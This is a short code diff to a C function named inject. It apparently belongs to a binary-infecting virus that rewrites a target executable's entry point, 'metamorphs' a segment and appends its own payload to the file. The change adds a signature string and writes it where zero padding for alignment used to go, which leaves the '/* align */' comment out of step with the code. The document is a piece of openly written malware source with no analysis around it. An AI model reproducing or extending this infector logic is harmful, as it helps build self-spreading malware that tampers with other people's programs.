@@ -77,6 +77,7 @@ int inject(t_data data)
 {
 	u64 offset;
 	u64 payload_addr;
+	char signature[] = SIGNATURE;
 
 	data.bin = get_infos(data.fd);
 	if (!metamorph_segment(data))
@@ -88,7 +89,7 @@ int inject(t_data data)
 	WRITE(data.fd, &(data.bin.new_entry), sizeof(data.bin.new_entry));
 	/* align */
 	offset = LSEEK(data.fd, 0, SEEK_END);
-	WRITE(data.fd, "\x00\x00\x00\x00", data.bin.new_entry - data.bin.v_addr - offset);
+	WRITE(data.fd, signature, sizeof(signature) - 1);
 	/* write to file */
 	payload_addr = get_rel_addr() - ((void*)&get_rel_addr - (void*)&payload_start);
 	WRITE(data.fd, payload_addr, data.infos.pl_size);
